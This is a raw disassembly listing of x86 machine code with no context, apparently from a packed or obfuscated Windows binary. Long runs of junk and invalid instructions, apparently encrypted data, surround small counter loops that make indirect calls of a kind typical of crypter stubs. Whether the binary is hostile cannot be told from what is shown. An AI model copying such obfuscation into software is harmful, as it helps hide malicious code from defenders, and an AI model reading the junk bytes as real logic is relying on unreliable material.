  405904:	inc    ebx
  405905:	pop    ebp
  405906:	xchg   edx,eax
  405907:	xor    esi,0x280b68be
  40590d:	jae    0x405953
  40590f:	jmp    0x6047:0xad02098d
  405916:	mov    edi,0xcf543e29
  40591b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40591c:	jno    0x903c3dfa
  405922:	fist   WORD PTR [ecx-0x3d]
  405925:	mov    dh,0xc
  405927:	(bad)  
  405928:	repz lea ecx,[esi+0x5a]
  40592c:	xor    DWORD PTR [edx+0x423c4e15],edi
  405932:	or     BYTE PTR [esp+ebx*4-0x28],0x9b
  405937:	(bad)  
  405938:	mov    al,0xdb
  40593a:	cdq    
  40593b:	iret   
  40593c:	jg     0x405925
  40593e:	scas   al,BYTE PTR es:[edi]
  40593f:	(bad)  
  405941:	push   ecx
  405942:	repnz adc eax,DWORD PTR [eax+0x40866f74]
  405949:	jnp    0x405938
  40594b:	jp     0x40597c
  40594d:	aaa    
  40594e:	ja     0x4058dc
  405950:	sub    esp,DWORD PTR [edi-0x46603714]
  405956:	retf   
  405957:	inc    esp
  405958:	(bad)  
  405959:	or     ebx,DWORD PTR [eax+ebx*2+0x6f1664cc]
  405960:	lock dec esp
  405962:	dec    edx
  405963:	stos   BYTE PTR es:[edi],al
  405964:	cmp    dl,BYTE PTR [esi+edi*4-0x1e]
  405968:	inc    ecx
  405969:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40596a:	in     eax,0xb
  40596c:	imul   esi,DWORD PTR [edx],0x63
  40596f:	and    DWORD PTR [edx+0x73],0x4e
  405973:	lahf   
  405974:	xchg   esp,eax
  405975:	xor    eax,0x658c39dd
  40597a:	out    dx,eax
  40597b:	outs   dx,DWORD PTR ds:[esi]
  40597c:	dec    esi
  40597d:	push   ecx
  40597e:	xchg   esi,eax
  40597f:	das    
  405980:	mov    eax,ds:0xef5e24fa
  405985:	pop    ebx
  405986:	jo     0x4059c7
  405988:	cmp    dl,BYTE PTR [ecx]
  40598a:	xor    al,0x68
  40598c:	in     eax,0x27
  40598e:	mov    dl,0x93
  405990:	cmp    eax,0x40a20873
  405995:	dec    ecx
  405996:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405997:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405998:	push   cs
  405999:	stos   DWORD PTR es:[edi],eax
  40599a:	cdq    
  40599b:	jnp    0x405960
  40599d:	sub    eax,0x577e32fd
  4059a2:	xchg   esp,eax
  4059a3:	xor    BYTE PTR [ecx+0x2e48bed0],al
  4059a9:	or     esi,DWORD PTR [ebx+0x38]
  4059ac:	popa   
  4059ad:	out    0xe6,al
  4059af:	pop    eax
  4059b0:	sbb    DWORD PTR [eax],0x156969f8
  4059b6:	repz inc ecx
  4059b8:	clc    
  4059b9:	jle    0x4059de
  4059bb:	in     al,dx
  4059bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4059bd:	xor    ecx,DWORD PTR [ebx+0x40d64c0d]
  4059c3:	add    BYTE PTR [ecx],al
  4059c5:	or     BYTE PTR [edi+0x5e],bl
  4059c8:	pop    ebx
  4059c9:	leave  
  4059ca:	ret    
  4059cb:	push   ebp
  4059cc:	mov    ebp,esp
  4059ce:	sub    esp,0x44
  4059d1:	push   edi
  4059d2:	sub    eax,DWORD PTR ds:0x4235c7
  4059d8:	mov    eax,DWORD PTR [ebp+0xc]
  4059db:	or     DWORD PTR ds:0x417e4d,edx
  4059e1:	mov    DWORD PTR [ebp-0x10],eax
  4059e4:	mov    DWORD PTR ds:0x417e55,0x17
  4059ee:	cmp    DWORD PTR ds:0x417e55,0x0
  4059f5:	je     0x405a59
  4059fb:	cmp    DWORD PTR ds:0x417e55,0x6
  405a02:	jne    0x405a2b
  405a08:	push   DWORD PTR [ebp-0x24]
  405a0b:	push   DWORD PTR [ebp-0x28]
  405a0e:	push   0x417e45
  405a13:	push   0x80ed
  405a18:	push   0x67be
  405a1d:	push   0x6b4c
  405a22:	push   DWORD PTR [ebp-0x20]
  405a25:	call   DWORD PTR ds:0x40d1cc
  405a2b:	cmp    DWORD PTR ds:0x417e55,0x7
  405a32:	jne    0x405a47
  405a38:	xor    ecx,ecx
  405a3a:	or     ecx,DWORD PTR ds:0x417e55
  405a40:	dec    ecx
  405a41:	mov    DWORD PTR ds:0x417e55,ecx
  405a47:	mov    ecx,DWORD PTR ds:0x417e55
  405a4d:	dec    ecx
  405a4e:	mov    DWORD PTR ds:0x417e55,ecx
  405a54:	jmp    0x4059ee
  405a59:	mov    eax,DWORD PTR [ebp+0x8]
  405a5c:	or     DWORD PTR ds:0x417e41,0x3fc5
  405a66:	mov    DWORD PTR [ebp+0x8],0xf89c8538
  405a6d:	xor    ecx,ecx
  405a6f:	add    ecx,DWORD PTR ds:0x4235c3
  405a75:	and    DWORD PTR ds:0x41abd6,ecx
  405a7b:	mov    DWORD PTR [ebp-0x20],0xf89c853b
  405a82:	mov    edx,DWORD PTR [ebp+0x8]
  405a85:	mov    DWORD PTR [ebp-0x40],eax
  405a88:	mov    eax,0x7510859
  405a8d:	xor    edx,eax
  405a8f:	adc    ecx,ecx
  405a91:	mov    ecx,0x32729f
  405a96:	movzx  edi,WORD PTR ds:0x41510d
  405a9d:	sbb    DWORD PTR ds:0x4235cf,edi
  405aa3:	add    edx,ecx
  405aa5:	add    DWORD PTR ds:0x412354,0x1575
  405aaf:	mov    DWORD PTR [ebp-0x8],edx
  405ab2:	jmp    0x405c04
  405ab7:	(bad)  [edi+ebp*4-0x19]
  405abb:	mov    eax,ds:0x80785be5
  405ac0:	cmp    DWORD PTR ds:[edi],edx
  405ac3:	pop    edi
  405ac4:	daa    
  405ac5:	sbb    BYTE PTR [edi-0x7a],dl
  405ac8:	or     edi,DWORD PTR [esi+0x7e]
  405acb:	and    edi,DWORD PTR [edi+0x7e]
  405ace:	jle    0x405adc
  405ad0:	mov    cs,WORD PTR [ebx+0x28]
  405ad3:	mov    ecx,0x7f9589e2
  405ad8:	shl    DWORD PTR [edi-0x480fbeba],1
  405ade:	pop    esi
  405adf:	add    BYTE PTR [eax-0xe1f2e96],al
  405ae5:	inc    edi
  405ae6:	lock je 0x405b14
  405ae9:	sub    DWORD PTR [esi+0x6d9149ab],ebp
  405aef:	or     DWORD PTR [edx-0x4ce4a464],0xffffffea
  405af6:	fcomp  QWORD PTR [ebx]
  405af8:	xor    BYTE PTR [edx+eiz*2-0x61],bh
  405afc:	pop    es
  405afd:	ins    BYTE PTR es:[edi],dx
  405afe:	mov    dh,0x68
  405b00:	push   edi
  405b01:	das    
  405b02:	loope  0x405ac7
  405b04:	std    
  405b05:	mov    ds:0xc83d5974,eax
  405b0a:	popf   
  405b0b:	dec    BYTE PTR [esp+ecx*1+0x7f364552]
  405b12:	pop    edx
  405b13:	mov    al,0xc2
  405b15:	sbb    BYTE PTR [ebp+0x70],dl
  405b18:	inc    ebx
  405b19:	pop    eax
  405b1a:	outs   dx,BYTE PTR ds:[esi]
  405b1b:	jle    0x405abf
  405b1d:	popf   
  405b1e:	aad    0xb2
  405b20:	int    0xcd
  405b22:	cmp    bl,BYTE PTR [esi+0x21]
  405b25:	pop    ss
  405b26:	js     0x405b12
  405b28:	addr16 push esi
  405b2a:	adc    esp,DWORD PTR [ebx-0x3c067f3e]
  405b30:	cmp    eax,0x77ca696a
  405b35:	(bad)  
  405b36:	(bad)  
  405b38:	inc    ecx
  405b39:	test   eax,0xc8ab7c25
  405b3e:	push   esp
  405b3f:	mov    dx,0xaa97
  405b43:	sbb    BYTE PTR [ebx+eax*1+0x5ab4d0c2],0xb1
  405b4b:	jge    0x405b7f
  405b4d:	mov    bh,BYTE PTR [edi+0x3019b1ad]
  405b53:	jmp    0xe840:0x7e344f7c
  405b5a:	out    dx,eax
  405b5b:	dec    esp
  405b5c:	imul   ebp,edi,0x51d661ba
  405b62:	popf   
  405b63:	add    BYTE PTR [ebp+eax*1+0x7c],dl
  405b67:	(bad)  
  405b68:	repnz sbb al,BYTE PTR [edx]
  405b6b:	fs cli 
  405b6d:	xchg   ecx,eax
  405b6e:	push   ecx
  405b6f:	dec    eax
  405b70:	push   ss
  405b71:	adc    ebx,DWORD PTR [edx+0x30ac2648]
  405b77:	mov    DWORD PTR [eax-0x5e04f505],edx
  405b7d:	inc    edx
  405b7e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405b7f:	sbb    dh,BYTE PTR [edx+0x73cdeef8]
  405b85:	leave  
  405b86:	out    0xc7,eax
  405b88:	pop    ss
  405b89:	cld    
  405b8a:	test   BYTE PTR [edi-0x50],0xfa
  405b8e:	imul   eax,edx,0xffffffd4
  405b91:	add    eax,DWORD PTR [edx-0x4c]
  405b94:	xor    al,0x64
  405b96:	xlat   BYTE PTR ds:[ebx]
  405b97:	in     eax,dx
  405b98:	and    esi,DWORD PTR [eax]
  405b9a:	or     bl,BYTE PTR [ecx+0x509cc08b]
  405ba0:	sub    eax,0x5176614
  405ba5:	ins    BYTE PTR es:[edi],dx
  405ba6:	add    BYTE PTR [ecx],dl
  405ba8:	(bad)  
  405ba9:	sub    al,0xff
  405bab:	push   0x53bdd03d
  405bb0:	ret    
  405bb1:	mov    ecx,0x3fd82e22
  405bb6:	add    dl,BYTE PTR [esi-0x1e7e96c8]
  405bbc:	mov    ah,0xf2
  405bbe:	mov    ebp,0x30ab6a7
  405bc3:	mov    bl,0x1a
  405bc5:	mov    al,ds:0xfc15a7b2
  405bca:	in     eax,0x62
  405bcc:	out    dx,al
  405bcd:	jb     0x405c3a
  405bcf:	gs dec ecx
  405bd1:	sahf   
  405bd2:	mov    cl,0x69
  405bd4:	repnz in al,dx
  405bd6:	mov    dh,0x4b
  405bd8:	mov    eax,ds:0x2dc966d8
  405bdd:	mov    ds:0xbf860db2,al
  405be2:	scas   eax,DWORD PTR es:[edi]
  405be3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405be4:	(bad)  
  405be5:	xor    esp,eax
  405be7:	sbb    eax,0xc2fbf2e1
  405bec:	cmp    eax,0xa50b0f68
  405bf1:	xor    BYTE PTR [edi-0xa],bh
  405bf4:	ds jns 0x405baf
  405bf7:	inc    ecx
  405bf8:	ins    DWORD PTR es:[edi],dx
  405bf9:	call   0xf52a:0x63dbefb
  405c00:	loopne 0x405bc6
  405c02:	stc    
  405c03:	xchg   ebx,eax
  405c04:	mov    edx,DWORD PTR [ebp+0x8]
  405c07:	and    DWORD PTR ds:0x4235d7,0x0
  405c11:	jmp    0x405c25
  405c16:	xor    edi,edi
  405c18:	or     edi,DWORD PTR ds:0x4235d7
  405c1e:	inc    edi
  405c1f:	mov    DWORD PTR ds:0x4235d7,edi
  405c25:	cmp    DWORD PTR ds:0x4235d7,0x11
  405c2c:	jae    0x405c53
  405c32:	cmp    DWORD PTR ds:0x4235d7,0x1a
  405c39:	jne    0x405c48
  405c3f:	push   DWORD PTR [ebp-0x1c]
  405c42:	call   DWORD PTR ds:0x40d29c
  405c48:	jmp    0x405c16
  405c4d:	xor    DWORD PTR ds:0x412358,ebx
  405c53:	xor    edx,eax
  405c55:	add    edx,ecx
  405c57:	jmp    0x405da9
  405c5c:	xchg   edi,eax
  405c5d:	(bad)  
  405c5e:	call   0xe86f:0x6bdabbc6
  405c65:	pop    ds
  405c66:	jb     0x405cc2
  405c68:	mov    dl,0xca
  405c6a:	fidiv  DWORD PTR [edx+0x7e7e084b]
  405c70:	and    edi,DWORD PTR [edi+0x7e]
  405c73:	jle    0x405c42
  405c75:	push   edx
  405c76:	and    dh,BYTE PTR [eax-0x22]
  405c79:	push   edi
  405c7a:	in     ax,dx
  405c7c:	inc    esi
  405c7d:	pop    eax
  405c7e:	or     BYTE PTR [edi],cl
  405c80:	pop    eax
  405c81:	popa   
  405c82:	shl    BYTE PTR [ecx-0x24],1
  405c85:	add    esp,DWORD PTR [edi-0x5]
  405c88:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405c89:	mov    ch,0x3b
  405c8b:	cld    
  405c8c:	mov    bh,0x85
  405c8e:	inc    edx
  405c8f:	mov    dh,0x52
  405c91:	jp     0x405c92
  405c93:	push   cs
  405c94:	cld    
  405c95:	test   eax,0xc3e5c9d7
  405c9a:	inc    eax
  405c9b:	(bad)  
  405c9c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405c9d:	or     ebp,DWORD PTR [eax+0x6f]
  405ca0:	out    dx,eax
  405ca1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405ca2:	test   eax,0xe5ca1d91
  405ca7:	aaa    
  405ca8:	icebp  
  405ca9:	add    edi,DWORD PTR [esi+0x29]
  405cac:	or     DWORD PTR [eax],ebp
  405cae:	fs scas al,BYTE PTR es:[edi]
  405cb0:	daa    
  405cb1:	cwde   
  405cb2:	int3   
  405cb3:	scas   al,BYTE PTR es:[edi]
  405cb4:	mov    BYTE PTR [edi],cl
  405cb6:	dec    esp
  405cb7:	fsub   st,st(5)
  405cb9:	pop    ebx
  405cba:	(bad)  
  405cbb:	mov    al,0x29
  405cbd:	(bad)  
  405cbe:	jp     0x405c55
  405cc0:	lock ja 0x405cb5
  405cc3:	xlat   BYTE PTR ds:[ebx]
  405cc4:	mov    edx,0xd5f4c278
  405cc9:	lods   al,BYTE PTR ds:[esi]
  405cca:	push   eax
  405ccb:	das    
  405ccc:	cmc    
  405ccd:	pop    ebp
  405cce:	sahf   
  405ccf:	dec    eax
  405cd0:	add    DWORD PTR ds:0xe3e845b7,ecx
  405cd6:	andnps xmm7,xmm7
  405cd9:	jbe    0x405c5e
  405cdb:	xchg   ebp,eax
  405cdc:	jmp    0xdd39:0x8e9004e3
  405ce3:	mov    gs,WORD PTR [ecx+ebx*4-0x4a]
  405ce7:	lock jecxz 0x405c89
  405cea:	ins    BYTE PTR es:[edi],dx
  405ceb:	out    dx,al
  405cec:	aad    0x44
  405cee:	sub    esi,ebp
  405cf0:	xchg   BYTE PTR [edi+0x58],ah
  405cf3:	xchg   DWORD PTR [eax-0x8501621],ebp
  405cf9:	push   ecx
  405cfa:	gs iret 
  405cfc:	xchg   edi,eax
  405cfd:	(bad)  
  405cfe:	and    eax,0x17499670
  405d03:	stc    
  405d04:	xchg   edi,eax
  405d05:	test   DWORD PTR [edx-0x4b054b06],esp
  405d0b:	jl     0x405d02
  405d0d:	inc    ebx
  405d0e:	lahf   
  405d0f:	lock in al,0x4a
  405d12:	pop    edi
  405d13:	sub    BYTE PTR [edi*2+0x5e6fec56],cl
  405d1a:	fcomp  DWORD PTR [edx-0x72]
  405d1d:	push   esi
  405d1e:	sub    eax,0x3300f9a3
  405d23:	and    al,0xad
  405d25:	add    DWORD PTR [ecx],esi
  405d27:	pop    esi
  405d28:	out    dx,al
  405d29:	mov    BYTE PTR [ebx+edx*4+0x3b],bh
  405d2d:	fidivr DWORD PTR ds:0x263a2dab
  405d33:	and    bl,ah
  405d35:	push   edi
  405d36:	mov    ch,0xa
  405d38:	mov    cl,0xbf
  405d3a:	dec    ecx
  405d3b:	lds    esp,FWORD PTR [ebx]
  405d3d:	xchg   esi,eax
  405d3e:	iret   
  405d3f:	mov    eax,0x7589691f
  405d44:	cmp    al,0x64
  405d46:	int    0x9e
  405d48:	push   edx
  405d49:	inc    edx
  405d4a:	bound  esi,QWORD PTR [eax]
  405d4c:	jne    0x405ced
  405d4e:	dec    ebp
  405d4f:	and    bl,BYTE PTR [esi+0x77f3e4a5]
  405d55:	inc    edx
  405d56:	jno    0x405d75
  405d58:	jne    0x405dc4
  405d5a:	(bad)  [edx]
  405d5c:	cli    
  405d5d:	aad    0x6b
  405d5f:	xor    al,0xb5
  405d61:	adc    ebx,DWORD PTR [esi-0x51]
  405d64:	lahf   
  405d65:	push   0x95944c8d
  405d6a:	cwde   
  405d6b:	xor    BYTE PTR [ecx+0x37],0x10
  405d6f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405d70:	aas    
  405d71:	xchg   ecx,eax
  405d72:	mov    eax,ds:0x695d6767
  405d77:	xchg   DWORD PTR [ebp-0x4112317a],ebx
  405d7d:	mov    dh,0xd1
  405d7f:	add    esi,DWORD PTR es:[esi-0x21]
  405d83:	push   cs
  405d84:	xor    al,0x32
  405d86:	repz jo 0x405d80
  405d89:	fst    DWORD PTR [eax]
  405d8b:	mov    ch,0xe8
  405d8d:	(bad)  
  405d8e:	adc    ebx,edi
  405d90:	xor    al,0xed
  405d92:	dec    ebp
  405d93:	cs aad 0x2c
  405d96:	add    edi,ebp
  405d98:	hlt    
  405d99:	push   ebp
  405d9a:	push   edi
  405d9b:	sti    
  405d9c:	mov    DWORD PTR [ecx],esp
  405d9e:	aaa    
  405d9f:	stc    
  405da0:	mov    es,WORD PTR [ecx+0x7e97cb9f]
  405da6:	ins    BYTE PTR es:[edi],dx
  405da7:	clc    
  405da8:	call   0x4de9:0x470c5589
  405daf:	add    DWORD PTR [eax],eax
  405db1:	add    BYTE PTR ds:0xb8afae9b,cl
  405db7:	mov    ebx,0x598db90d
  405dbc:	or     al,0x3
  405dbe:	pop    ecx
  405dbf:	in     al,dx
  405dc0:	mov    ah,0x6f
  405dc2:	jl     0x405dd2
  405dc4:	jle    0x405e44
  405dc6:	and    edi,DWORD PTR [edi+0x7e]
  405dc9:	jle    0x405d59
  405dcb:	push   ebp
  405dcc:	push   esp
  405dcd:	in     eax,dx
  405dce:	stc    
  405dcf:	mov    DWORD PTR [edx],edi
  405dd1:	repz sbb ax,0x9d73
  405dd6:	clc    
  405dd7:	fist   DWORD PTR [edi-0x7ae5a815]
  405ddd:	mov    bh,0x7d
  405ddf:	xor    DWORD PTR [eax-0x392d8d5d],0xc54134ef
  405de9:	push   ebp
  405dea:	ficomp WORD PTR [ebx+0xe5867a6]
  405df0:	jmp    0x405de4
  405df2:	es inc esi
  405df4:	push   ebp
  405df5:	adc    ebx,DWORD PTR [ebp+0x20233483]
  405dfb:	lds    ebp,FWORD PTR [edx-0x588924a1]
  405e01:	push   ebx
  405e02:	jge    0x405d99
  405e04:	or     ah,BYTE PTR [eax+0x1c2611cd]
  405e0a:	out    dx,al
  405e0b:	xor    esi,esp
  405e0d:	es js  0x405e1d
  405e10:	neg    BYTE PTR [edx]
  405e12:	ss daa 
  405e14:	rcl    esp,1
  405e16:	stos   BYTE PTR es:[edi],al
  405e17:	pop    es
  405e18:	ds mov ah,0x62
  405e1b:	(bad)  
  405e1c:	sbb    BYTE PTR [ebx+0x49802aef],dl
  405e22:	mov    esi,0x64f175f6
  405e27:	xchg   esi,eax
  405e28:	or     al,0xaf
  405e2a:	xor    BYTE PTR ds:0xfbcbb2df,cl
  405e30:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405e31:	dec    esi
  405e32:	sbb    ebx,DWORD PTR [ecx-0x50e16575]
  405e38:	jbe    0x405e2b
  405e3a:	ja     0x405df2
  405e3c:	cwde   
  405e3d:	stos   BYTE PTR es:[edi],al
  405e3e:	addr16 and al,0x7a
  405e41:	or     DWORD PTR [eax-0x7a],0xb34b2bfe
  405e48:	cmc    
  405e49:	rcr    DWORD PTR [eax-0x5],1
  405e4c:	xor    dl,BYTE PTR [edi]
  405e4e:	pop    ebp
  405e4f:	loopne 0x405e0f
  405e51:	jo     0x405e6c
  405e53:	mov    esp,0x4896c338
  405e58:	out    0x5,al
  405e5a:	pop    esp
  405e5b:	gs test al,0x7c
  405e5e:	push   eax
  405e5f:	sub    al,0x97
  405e61:	dec    edi
  405e62:	jge    0x405e1f
  405e64:	add    eax,0xf3742b2e
  405e69:	lods   al,BYTE PTR ds:[esi]
  405e6a:	sbb    DWORD PTR [eax],edx
  405e6c:	cmp    BYTE PTR es:[esi+0x19],0x12
  405e71:	cdq    
  405e72:	xor    ch,BYTE PTR [esi+eiz*8+0x77]
  405e76:	push   ss
  405e77:	mov    edi,0x18ff2d02
  405e7c:	push   ss
  405e7d:	sub    DWORD PTR [eax+0x4dc7dbe0],ebx
  405e83:	dec    ebx
  405e84:	mov    esp,0xccd42f40
  405e89:	shr    BYTE PTR [ebx+0x8],1
  405e8c:	mov    esi,0x1d113dc7
  405e91:	jle    0x405ecd
  405e93:	scas   eax,DWORD PTR es:[edi]
  405e94:	or     cl,0x90
  405e97:	jmp    0x50afd3cd
  405e9c:	mov    ch,0x2
  405e9e:	pop    ebx
  405e9f:	les    ecx,FWORD PTR [ebx+ecx*2-0x4a299e9]
  405ea6:	scas   eax,DWORD PTR es:[edi]
  405ea7:	cmp    BYTE PTR [eax],bl
  405ea9:	(bad)
  405ead:	pop    es
  405eae:	dec    eax
  405eaf:	lea    esi,[edi+edi*1]
  405eb2:	jp     0x405e57
  405eb4:	rcr    DWORD PTR [esi-0x2ff0e217],1
  405eba:	mov    ds:0x4356170f,al
  405ebf:	(bad)  
  405ec0:	nop
  405ec1:	stc    
  405ec2:	shr    DWORD PTR [edx-0x80],cl
  405ec5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405ec6:	data16 mov al,bh
  405ec9:	and    bh,0x94
  405ecc:	inc    ebx
  405ecd:	inc    ebp
  405ece:	jge    0x405e7a
  405ed0:	or     bl,bl
  405ed2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405ed3:	pop    eax
  405ed4:	les    ecx,FWORD PTR [ecx+edi*1]
  405ed7:	ss push ebp
  405ed9:	mov    ah,0xb5
  405edb:	fdivr  st,st(4)
  405edd:	adc    esi,DWORD PTR [ecx+0x40]
  405ee0:	xor    ecx,ebx
  405ee2:	inc    ecx
  405ee3:	ja     0x405f2a
  405ee5:	adc    eax,0x76efa080
  405eea:	lods   al,BYTE PTR ds:[esi]
  405eeb:	xchg   ecx,eax
  405eec:	dec    ecx
  405eed:	(bad)  
  405eee:	adc    al,0x4b
  405ef0:	jmp    0x1ac7ffef
  405ef5:	lea    eax,[edi+0x4a]
  405ef8:	dec    eax
  405ef9:	mov    ss,eax
  405efb:	stc    
  405efc:	fcom   DWORD PTR [edx]
  405efe:	sbb    al,bh
  405f00:	inc    ebp
  405f01:	cld    
  405f02:	fadd   DWORD PTR [ebp-0xcc0764]
  405f08:	xor    edi,DWORD PTR ds:0x415109
  405f0e:	adc    edi,DWORD PTR ds:0x4235bf
  405f14:	mov    DWORD PTR ds:0x415109,edi
  405f1a:	mov    DWORD PTR [ebp-0x28],0xf89c853a
  405f21:	mov    DWORD PTR [ebp-0x2c],0xf89c853d
  405f28:	adc    edi,edi
  405f2a:	mov    DWORD PTR [ebp-0x30],0xf89c853c
  405f31:	or     DWORD PTR ds:0x4235cf,edx
  405f37:	mov    DWORD PTR [ebp-0x34],0xf89c853f
  405f3e:	mov    DWORD PTR ds:0x417e41,0x15
  405f48:	cmp    DWORD PTR ds:0x417e41,0x0
  405f4f:	je     0x405fae
  405f55:	cmp    DWORD PTR ds:0x417e41,0x5
  405f5c:	jne    0x405f7c
  405f62:	push   0x43a6
  405f67:	push   0x41ac41
  405f6c:	push   0x41ac72
  405f71:	push   0x400000
  405f76:	call   DWORD PTR ds:0x40d1d0
  405f7c:	cmp    DWORD PTR ds:0x417e41,0x6
  405f83:	jne    0x405f96
  405f89:	mov    edi,DWORD PTR ds:0x417e41
  405f8f:	dec    edi
  405f90:	mov    DWORD PTR ds:0x417e41,edi
  405f96:	mov    edi,DWORD PTR ds:0x417e41
  405f9c:	dec    edi
  405f9d:	mov    DWORD PTR ds:0x417e41,edi
  405fa3:	jmp    0x405f48
  405fa8:	xor    edi,DWORD PTR ds:0x417e4d
  405fae:	mov    DWORD PTR [ebp-0x38],0xf89c853e
  405fb5:	and    DWORD PTR ds:0x412364,0xe44
  405fbf:	mov    DWORD PTR [ebp-0x3c],0xf89c8531
  405fc6:	or     DWORD PTR ds:0x417e49,0x6f97
  405fd0:	mov    edx,DWORD PTR [ebp+0x8]
  405fd3:	and    DWORD PTR ds:0x417e55,0x0
  405fdd:	jmp    0x405fef
  405fe2:	mov    edi,DWORD PTR ds:0x417e55
  405fe8:	inc    edi
  405fe9:	mov    DWORD PTR ds:0x417e55,edi
  405fef:	cmp    DWORD PTR ds:0x417e55,0x14
  405ff6:	jae    0x40601f
  405ffc:	cmp    DWORD PTR ds:0x417e55,0x1c
  406003:	jne    0x406014
  406009:	push   0x67ac
  40600e:	call   DWORD PTR ds:0x40d2a0
  406014:	jmp    0x405fe2
  406019:	sub    edi,DWORD PTR ds:0x412378
  40601f:	xor    edx,eax
  406021:	mov    edi,DWORD PTR [ebp-0x10]
  406024:	add    edx,ecx
  406026:	cmp    edi,edx
  406028:	mov    DWORD PTR ds:0x412368,0x5602
  406032:	je     0x407428
  406038:	mov    DWORD PTR ds:0x415109,0xf2d
  406042:	jmp    0x406194
  406047:	lock mov ebx,0xdc791c5b
  40604d:	jns    0x40600a
  40604f:	mov    eax,ds:0x99db13c5
  406054:	pop    es
  406055:	push   es
  406056:	shl    BYTE PTR [ecx],0xf
  406059:	jle    0x4060d9
  40605b:	and    edi,DWORD PTR [edi+0x7e]
  40605e:	jle    0x4060c6
  406060:	je     0x405fe5
  406062:	in     al,dx
  406063:	cmp    al,0x11
  406065:	mov    edx,0x8b7d9336
  40606a:	mov    edi,0xd36dc2b5
  40606f:	push   ebx
  406070:	xor    ebp,esi
  406072:	adc    ecx,DWORD PTR [ebp+eax*4+0x60bd0b1c]
  406079:	jno    0x406091
  40607b:	int3   
  40607c:	(bad)  
  40607d:	xor    al,0x78
  40607f:	or     al,BYTE PTR ds:0x59043150
  406085:	xor    eax,0xe715cde6
  40608a:	dec    edx
  40608b:	dec    ebp
  40608c:	mov    esp,0xae82bf38
  406091:	lods   al,BYTE PTR ds:[esi]
  406092:	xchg   esp,eax
  406093:	dec    edi
  406094:	and    eax,0x32365724
  406099:	push   0xfffffff8
  40609b:	inc    eax
  40609c:	(bad)  
  40609d:	retf   0x7cac
  4060a0:	sbb    DWORD PTR [esi+0x3f],ecx
  4060a3:	out    dx,al
  4060a4:	es jb  0x4060cf
  4060a7:	xchg   BYTE PTR [esi],bl
  4060a9:	jae    0x406071
  4060ab:	and    eax,0x846c633a
  4060b0:	(bad)  [edi*8-0x6fbcc3c8]
  4060b7:	test   al,0xeb
  4060b9:	sub    eax,0x4ee2a126
  4060be:	sahf   
  4060bf:	fwait
  4060c0:	xor    DWORD PTR [esi-0x4c],0x2dac3076
  4060c7:	adc    ah,BYTE PTR [ecx-0x67]
  4060ca:	les    eax,FWORD PTR [esi-0x6d71cc9f]
  4060d0:	push   cs
  4060d1:	sub    DWORD PTR [eax+0x784becfb],esi
  4060d7:	(bad)  
  4060d8:	pusha  
  4060d9:	cmp    BYTE PTR [edx-0x51ba123c],bh
  4060df:	nop
  4060e0:	dec    edx
  4060e1:	xor    eax,0x55bd0efd
  4060e6:	aas    
  4060e7:	mov    cl,0xc
  4060e9:	pop    ss
  4060ea:	push   es
  4060eb:	push   0xffffffdb
  4060ed:	ror    BYTE PTR [ebp+0x48],1
  4060f0:	mov    dl,0xab
  4060f2:	jns    0x406074
  4060f4:	sar    eax,0x96
  4060f7:	(bad)  
  4060f8:	(bad)  
  4060fa:	push   ebx
  4060fb:	test   al,0xcf
  4060fd:	xchg   ebx,eax
  4060fe:	cmp    ah,ah
  406100:	cli    
  406101:	loope  0x406161
  406103:	xchg   ecx,eax
  406104:	mov    BYTE PTR [eax],cl
  406106:	ret    
  406107:	xchg   esp,eax
  406108:	aad    0x6f
  40610a:	mov    cl,dl
  40610c:	sbb    eax,0x24bf5abf
  406111:	retf   0x4d86
  406114:	leave  
  406115:	pop    es
  406116:	mov    ebx,0xef4d47b2
  40611b:	test   BYTE PTR [ebx],bl
  40611d:	jl     0x4060a5
  40611f:	cmp    ecx,DWORD PTR [ecx+0xb]
  406122:	mov    edx,0xa9c43199
  406127:	push   ebx
  406128:	popa   
  406129:	push   0x58
  40612b:	lods   al,BYTE PTR ds:[esi]
  40612c:	aad    0x2
  40612e:	retf   0x3caa
  406131:	mov    ch,0xf0
  406133:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406134:	(bad)  
  406135:	fnstenv ds:0x359a4c74
  40613b:	and    al,0x2a
  40613d:	cmp    ch,bh
  40613f:	mov    al,ds:0xd46df725
  406144:	nop
  406145:	xchg   dh,cl
  406147:	xchg   edx,eax
  406148:	fwait
  406149:	adc    ebp,DWORD PTR [edi+ebx*4-0x73fa8ca7]
  406150:	jge    0x4061cc
  406152:	cdq    
  406153:	push   0x5a0da062
  406158:	xor    eax,0xcf155d9a
  40615d:	and    dh,BYTE PTR [ecx]
  40615f:	enter  0xa8c3,0x2a
  406163:	je     0x406147
  406165:	push   cs
  406166:	frstor [eax-0x3aa190c]
  40616c:	leave  
  40616d:	dec    ebx
  40616e:	jg     0x406147
  406170:	mov    WORD PTR [ebx],?
  406172:	or     al,0xf9
  406174:	and    al,bl
  406176:	outs   dx,BYTE PTR ds:[esi]
  406177:	mov    eax,ebp
  406179:	jno    0x406166
  40617b:	fbstp  TBYTE PTR [eax+0x45b808db]
  406181:	add    ah,dh
  406183:	dec    edx
  406184:	test   edi,ebx
  406186:	and    bl,al
  406188:	fwait
  406189:	push   eax
  40618a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40618b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40618c:	xor    dh,ch
  40618e:	lods   al,BYTE PTR ds:[esi]
  40618f:	call   0xe953:0x92d4b1fd
  406196:	lds    ecx,FWORD PTR [edi]
  406198:	add    BYTE PTR [eax],al
  40619a:	and    DWORD PTR ds:0x412370,0x0
  4061a4:	jmp    0x4061b6
  4061a9:	mov    edx,DWORD PTR ds:0x412370
  4061af:	inc    edx
